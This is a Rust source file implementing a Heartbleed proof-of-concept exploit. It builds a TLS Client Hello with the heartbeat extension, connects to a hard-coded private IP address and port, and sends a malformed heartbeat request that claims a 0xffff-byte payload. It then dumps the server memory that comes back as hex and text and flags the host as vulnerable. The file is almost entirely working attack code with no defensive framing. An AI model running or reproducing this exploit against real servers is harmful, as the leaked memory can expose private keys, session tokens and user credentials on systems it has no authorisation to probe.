use std::{io::{Read, Write}, net::TcpStream};

const HEARTBEAT_BUFFER: [u8; 8] = [
    0x18,           // TLS Content Type
    0x03, 0x02,     // TLS Version
    0x00, 0x03,     // Length
    0x01,           // HeartbeatMessageType
    0xff, 0xff,     // Payload Length
];

const SSL_CLIENT_HELLO: [u8; 288]  = [

    // Content Type
    0x16 ,
    // TLS Version
    0x03 ,0x02 ,
    // TLS Record Length
    0x01 ,0x1b ,
    // Handshake Type
    0x01 ,
    // Client Hello Length
    0x00 ,0x01 ,0x17 ,
    // TLS Version
    0x03 ,0x02 ,
    0xe2 ,0xa2 ,0xfe ,0x71 ,
    0xf8 ,0x84 ,0x57 ,0x3f ,0x41 ,0xbe ,0x75 ,0xeb ,0x35 ,0xf9 ,0x10 ,0xea ,0x2e ,0x39 ,0x49 ,0x10 ,0x95 ,0xdd ,0x40 ,0xd1 ,0x15 ,0x8b ,0x71 ,0x4c ,0xc3 ,0x22 ,0x6d ,0x64 ,
    0x20 ,
    0x1a ,0x8f ,0x01 ,0xa3 ,0xd5 ,0x80 ,0x25 ,0x30 ,0xd6 ,0xa2 ,0x7e ,0xb0 ,0x0b ,0x3e ,0x80 ,0xf9 ,0x06 ,0x77 ,0xae ,0xe8 ,0x33 ,0x88 ,0x37 ,0xe2 ,0xb9 ,0x4f ,0x02 ,0x7c ,0x8a ,0x57 ,0x2a ,0x1d ,
    // Cipher Suites Length
    0x00 ,0x3e ,
    // Cipher Suites
    0x13 ,0x02 ,0x13 ,0x03 ,0x13 ,0x01 ,0xc0 ,0x2c ,0xc0 ,0x30 ,0x00 ,0x9f ,0xcc ,0xa9 ,0xcc ,0xa8 ,0xcc ,0xaa ,
    0xc0 ,0x2b ,0xc0 ,0x2f ,0x00 ,0x9e ,0xc0 ,0x24 ,0xc0 ,0x28 ,0x00 ,0x6b ,0xc0 ,0x23 ,0xc0 ,0x27 ,
    0x00 ,0x67 ,0xc0 ,0x0a ,0xc0 ,0x14 ,0x00 ,0x39 ,0xc0 ,0x09 ,0xc0 ,0x13 ,0x00 ,0x33 ,0x00 ,0x9d ,
    0x00 ,0x9c ,0x00 ,0x3d ,0x00 ,0x3c ,0x00 ,0x35 ,0x00 ,0x2f ,0x00 ,0xff ,
    // Compression Methods Length
    0x01 ,
    // Compression Method
    0x00 ,
    // Extensions Length
    0x00 ,0x90 ,
    // Extensions
    0x00 ,0x0b ,0x00 ,0x04 ,0x03 ,0x00 ,0x01 ,0x02 ,0x00 ,0x0a ,
    0x00 ,0x0c ,0x00 ,0x0a ,0x00 ,0x1d ,0x00 ,0x17 ,0x00 ,0x1e ,0x00 ,0x19 ,0x00 ,0x18 ,0x00 ,0x23 , 
    0x00 ,0x00 ,0x00 ,0x16 ,0x00 ,0x00 ,0x00 ,0x17 ,0x00 ,0x00 ,0x00 ,0x0d ,0x00 ,0x2a ,0x00 ,0x28 , 
    0x04 ,0x03 ,0x05 ,0x03 ,0x06 ,0x03 ,0x08 ,0x07 ,0x08 ,0x08 ,0x08 ,0x09 ,0x08 ,0x0a ,0x08 ,0x0b , 
    0x08 ,0x04 ,0x08 ,0x05 ,0x08 ,0x06 ,0x04 ,0x01 ,0x05 ,0x01 ,0x06 ,0x01 ,0x03 ,0x03 ,0x03 ,0x01 ,
    0x03 ,0x02 ,0x04 ,0x02 ,0x05 ,0x02 ,0x06 ,0x02 ,0x00 ,0x2b ,0x00 ,0x05 ,0x04 ,0x03 ,0x04 ,0x03 ,
    0x03 ,0x00 ,0x2d ,0x00 ,0x02 ,0x01 ,0x01 ,0x00 ,0x33 ,0x00 ,0x26 ,0x00 ,0x24 ,0x00 ,0x1d ,0x00 ,
    0x20 ,0x9a ,0x45 ,0x90 ,0x4c ,0x34 ,0x76 ,0x48 ,0x95 ,0x3f ,0x34 ,0x4c ,0x05 ,0x2a ,0xd7 ,0x31 ,
    0x08 ,0xba ,0x75 ,0x44 ,0x0c ,0xfb ,0x34 ,0xd3 ,0x70 ,
    0x85 ,0x50 ,0xea ,0xed ,0xfe ,0xbb ,0x6f ,
    0x70 ,
    // Heartbeat Extension
    0x00 ,0x0f ,0x00 ,0x01 , 0x01
    /* Padding Extension
    0x00 ,0x15 ,0x00 ,0xd0 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
    0x00 ,0x00 ,0x00 ,0x00 ,0x00*/

    /* server_name Extension
        0x00 ,0x00 ,0x00 ,0x12 ,0x00 ,0x10 ,0x00 ,0x00 ,0x0d ,0x31 ,0x37 ,0x32 ,0x2e ,0x31 ,0x39 ,0x2e ,
    0x31 ,0x39 ,0x2e ,0x32 ,0x35 ,0x32 ,*/
];

fn main() {

    let mut tcp_stream = TcpStream::connect("172.19.19.252:8443").unwrap();
    /*
       struct {
        HeartbeatMessageType type;
        uint16 payload_length;
        opaque payload[HeartbeatMessage.payload_length];
        opaque padding[padding_length];
        } HeartbeatMessage
   */

   /* TLS Version Numbers
        0x0002 | SSLv2
        0x0300 | SSLv3
        0x0301 | TLS 1.0
        0x0302 | TLS 1.1
        0x0303 | TLS 1.2
        0x0304 | TLS 1.3
    */
    println!("[+] Sending Client Hello..");
    let _ = tcp_stream.write_all(&SSL_CLIENT_HELLO);
    let _ = tcp_stream.flush();
    println!("[+] Client Hello Sent..");

    loop {

        let tls_record: TlsRecord = recv_tls_record(&tcp_stream);
        if tls_record.content_type == 0x15 {
            println!("[!] Received Alert when trying to get TlsRecord.");
            std::process::exit(-1);
        } else if tls_record.content_type == 0x00 {
            println!("[!] Got NULL Content Type.. Handshake failed!");
            std::process::exit(-1);
        }
        println!("[+] TLS Record:\n\tContent Type: {:#x}", tls_record.content_type);
        println!("\tVersion: {:#04x}", tls_record.version);
        println!("\tLength: {:#04x}", tls_record.length);

        let mut record_data = vec![0; tls_record.length.into()];
        let _ = tcp_stream.read_exact(&mut record_data);

        if tls_record.content_type == 0x16 && record_data[0] == 0x0e {
            break;
        }
    }

    println!("[+] Sending HeartBeat Request..");
    let _bw = tcp_stream.write_all(&HEARTBEAT_BUFFER).unwrap();
    let _ = tcp_stream.flush();
    println!("[+] HeartBeat Request Sent..");

    loop {

        let tls_record: TlsRecord = recv_tls_record(&tcp_stream);

        if tls_record.content_type == 0x18 {         // TLS Content Type is 24|0x18
            println!("[+] Got Heartbeat Response!");
            println!("[+] TLS Content Type: {:#x}", tls_record.content_type);
            println!("[+] TLS Version: {:#x}", tls_record.version);
            println!("[+] Payload Length : {:#x}", tls_record.length);
            
            let mut record_data = vec![0; tls_record.length.into()];
            tcp_stream.read_exact(&mut record_data).unwrap();

            if record_data.len() > 3 {
                println!("[+] Got {} bytes, host seems vulnerable!", record_data.len());
            }
            let mut nl_iter = 0;
            
            for b in &record_data {
                if nl_iter % 16 == 0 {
                    println!("");
                }
                print!("{:#02x} ", b);
                nl_iter = nl_iter + 1;
            }

            println!("\n[+] Bytes converted into UTF8 lossy [+]");

            println!("[\n{}\n]", String::from_utf8_lossy(&record_data));
        } else if tls_record.content_type == 0x15 {
            println!("[!] Received Alert when trying to get TlsRecord.");
            std::process::exit(-1);
        }
        else {println!("[!] TLS Content Type: {:#x} - Stopping!", tls_record.content_type); break;}
    }
}

struct TlsRecord {
    content_type: u8,
    version: u16,
    length: u16
}

fn recv_tls_record(mut s: &TcpStream) -> TlsRecord {

    let mut record = [0; 5];
    let _ = s.read_exact(&mut record);

    TlsRecord {
        content_type: record[0],
        version: ((record[1] as u16) << 8) | record[2] as u16,
        length: ((record[3] as u16) << 8) | record[4] as u16,
    }

}